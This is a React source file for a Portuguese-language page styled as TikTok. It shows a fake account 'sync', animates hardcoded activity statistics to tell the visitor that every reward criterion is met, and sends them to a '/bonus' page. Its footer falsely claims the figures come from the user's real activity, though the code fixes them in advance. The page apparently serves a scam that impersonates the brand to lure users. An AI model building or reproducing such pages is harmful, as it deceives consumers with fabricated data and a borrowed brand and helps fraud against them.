import { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import tiktokLogo from "@/assets/tiktok-logo.png";

interface StatItem {
  label: string;
  current: number;
  target: number;
  fillPercent: number;
}

const INITIAL_STATS: StatItem[] = [
  { label: "Vídeos assistidos", current: 0, target: 50, fillPercent: 0 },
  { label: "Tempo em uso na plataforma", current: 0, target: 1000, fillPercent: 0 },
  { label: "Vídeos curtidos", current: 0, target: 100, fillPercent: 0 },
];

const FINAL_STATS: StatItem[] = [
  { label: "Vídeos assistidos", current: 50, target: 50, fillPercent: 100 },
  { label: "Tempo em uso na plataforma", current: 1000, target: 1000, fillPercent: 100 },
  { label: "Vídeos curtidos", current: 100, target: 100, fillPercent: 100 },
];

const STATUS_MESSAGES = [
  "Analisando seus vídeos assistidos…",
  "Verificando tempo de uso na plataforma…",
  "Contabilizando vídeos curtidos…",
  "✅ Todos os critérios foram atingidos!",
];

const FloatingParticles = () => (
  <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
    {[...Array(6)].map((_, i) => (
      <div
        key={i}
        className="absolute rounded-full opacity-20"
        style={{
          width: `${8 + i * 4}px`,
          height: `${8 + i * 4}px`,
          background: i % 2 === 0 ? '#fe2c55' : '#25f4ee',
          left: `${10 + i * 15}%`,
          top: `${20 + (i % 3) * 25}%`,
          animation: `floatParticle ${3 + i * 0.5}s ease-in-out infinite alternate`,
          animationDelay: `${i * 0.4}s`,
        }}
      />
    ))}
  </div>
);

const ActivityLanding = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [statusIdx, setStatusIdx] = useState(0);
  const [showBtn, setShowBtn] = useState(false);
  const [animatedStats, setAnimatedStats] = useState<StatItem[]>(INITIAL_STATS);
  const [completedCount, setCompletedCount] = useState(0);

  useEffect(() => {
    const t = setTimeout(() => setLoading(false), 2500);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (loading) return;

    const timers: ReturnType<typeof setTimeout>[] = [];

    FINAL_STATS.forEach((stat, i) => {
      timers.push(setTimeout(() => {
        setStatusIdx(i);
        setAnimatedStats(prev => {
          const next = [...prev];
          next[i] = stat;
          return next;
        });
        setCompletedCount(i + 1);
      }, i * 1200));
    });

    timers.push(setTimeout(() => {
      setStatusIdx(3);
    }, FINAL_STATS.length * 1200));

    timers.push(setTimeout(() => {
      setShowBtn(true);
    }, FINAL_STATS.length * 1200 + 800));

    return () => timers.forEach(clearTimeout);
  }, [loading]);

  const handleClaim = useCallback(() => {
    navigate("/bonus");
  }, [navigate]);

  if (loading) {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white">
        <div className="relative">
          <div className="absolute -inset-4 rounded-full bg-[#fe2c55]/10 animate-ping" />
          <img src={tiktokLogo} alt="TikTok" className="h-12 w-auto object-contain relative z-10 animate-pulse" />
        </div>
        <div className="w-10 h-10 rounded-full border-[3px] border-gray-200 border-t-[#fe2c55] animate-spin mt-6 mb-4" />
        <p className="text-sm text-gray-500 font-medium animate-pulse">Sincronizando com a sua conta...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center p-4 relative">
      <FloatingParticles />

      <div className="w-full max-w-md space-y-4 relative z-10">
        {/* Logo */}
        <div className="flex items-center justify-center mb-2 animate-fade-in">
          <img src={tiktokLogo} alt="TikTok" className="h-6 w-auto object-contain" />
        </div>

        {/* Main card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 space-y-5 animate-scale-in relative overflow-hidden">
          {/* Shimmer decoration on top */}
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#25f4ee] via-[#fe2c55] to-[#25f4ee] bg-[length:200%_100%]"
            style={{ animation: "shimmerGradient 3s linear infinite" }}
          />

          <div>
            <h1 className="text-[22px] font-bold text-gray-900 leading-tight">
              Você atingiu todos os{" "}
              <span className="text-[#fe2c55]">critérios de atividade.</span>
            </h1>
            <p className="text-sm text-gray-500 mt-2 leading-relaxed">
              Confirmamos que sua conta cumpriu os requisitos mínimos de uso. Confira o resumo abaixo e toque para liberar o seu progresso.
            </p>
          </div>

          {/* Progress badge */}
          <div className="flex items-center justify-center">
            <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-50 border border-emerald-100 text-emerald-600 text-xs font-medium transition-all duration-500">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
              {completedCount}/3 critérios completos
            </div>
          </div>

          {/* Stats box */}
          <div className="border border-gray-100 rounded-xl p-4 space-y-4 bg-gray-50/50">
            <div className="flex items-center gap-2 text-sm font-medium text-gray-600">
              <span className="w-2 h-2 rounded-full bg-emerald-500 inline-block animate-pulse" />
              Detalhes da sua atividade
            </div>

            {animatedStats.map((stat, i) => {
              const isComplete = stat.fillPercent === 100;
              return (
                <div key={i} className={`space-y-1.5 transition-all duration-500 ${isComplete ? "scale-[1.01]" : ""}`}>
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-700 flex items-center gap-1.5">
                      {isComplete && (
                        <span className="text-emerald-500 text-xs animate-scale-in">✓</span>
                      )}
                      {stat.label}
                    </span>
                    <span className={`text-sm font-medium tabular-nums transition-colors duration-500 ${isComplete ? "text-emerald-500" : "text-gray-400"}`}>
                      {stat.current}/{stat.target}
                    </span>
                  </div>
                  <div className="w-full h-1.5 bg-gray-100 rounded-full overflow-hidden">
                    <div
                      className={`h-full rounded-full transition-all duration-1000 ease-out ${isComplete ? "bg-emerald-500" : "bg-[#fe2c55]"}`}
                      style={{ width: `${stat.fillPercent}%` }}
                    />
                  </div>
                </div>
              );
            })}
          </div>

          {/* Status message */}
          <p className={`text-center text-sm transition-all duration-300 ${statusIdx === 3 ? "text-emerald-500 font-medium" : "text-gray-400"}`}>
            {STATUS_MESSAGES[statusIdx]}
          </p>

          {/* CTA button */}
          <div className={`transition-all duration-700 ${showBtn ? "opacity-100 translate-y-0" : "opacity-0 translate-y-4 pointer-events-none"}`}>
            <button
              onClick={handleClaim}
              className="w-full py-3.5 rounded-xl bg-[#fe2c55] text-white font-bold text-[15px] hover:brightness-110 active:scale-[0.98] transition-all flex items-center justify-center gap-2 shadow-lg shadow-[#fe2c55]/30 relative overflow-hidden group"
              style={{ animation: "ctaPulse 1.4s ease-in-out infinite" }}
            >
              {/* Button shine effect */}
              <span className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700" />
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16" className="relative z-10">
                <path d="M5.5 9.511c.076.954.83 1.697 2.182 1.785V12h.6v-.709c1.4-.098 2.218-.846 2.218-1.932 0-.987-.626-1.496-1.745-1.76l-.473-.112V5.57c.6.068.982.396 1.074.85h1.052c-.076-.919-.864-1.638-2.126-1.716V4h-.6v.719c-1.195.117-2.01.836-2.01 1.853 0 .9.606 1.472 1.613 1.707l.397.098v2.034c-.615-.093-1.022-.43-1.114-.9zm2.177-2.166c-.59-.137-.91-.416-.91-.836 0-.47.345-.822.915-.925v1.76h-.005zm.692 1.193c.717.166 1.048.435 1.048.91 0 .542-.412.914-1.135.982V8.518z" />
                <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16" />
                <path d="M8 13.5a5.5 5.5 0 1 1 0-11 5.5 5.5 0 0 1 0 11m0 .5A6 6 0 1 0 8 2a6 6 0 0 0 0 12" />
              </svg>
              <span className="relative z-10">Liberar meu progresso</span>
            </button>
          </div>

          <p className="text-center text-[11px] text-gray-400">
            Os dados acima são gerados automaticamente com base na sua interação recente na plataforma.
          </p>
        </div>
      </div>

      {/* Custom keyframes */}
      <style>{`
        @keyframes floatParticle {
          0% { transform: translateY(0px) scale(1); }
          100% { transform: translateY(-20px) scale(1.3); }
        }
        @keyframes shimmerGradient {
          0% { background-position: -200% 0; }
          100% { background-position: 200% 0; }
        }
      `}</style>
    </div>
  );
};

export default ActivityLanding;
